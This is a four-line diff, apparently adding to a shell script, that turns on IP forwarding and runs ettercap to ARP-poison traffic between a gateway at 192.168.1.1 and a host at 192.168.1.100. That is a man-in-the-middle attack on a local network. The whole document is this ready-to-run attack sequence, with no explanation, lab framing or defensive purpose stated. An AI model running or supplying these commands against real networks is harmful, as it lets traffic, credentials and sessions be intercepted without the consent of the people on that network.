@@ -1,0 +1,4 @@
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+
+sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
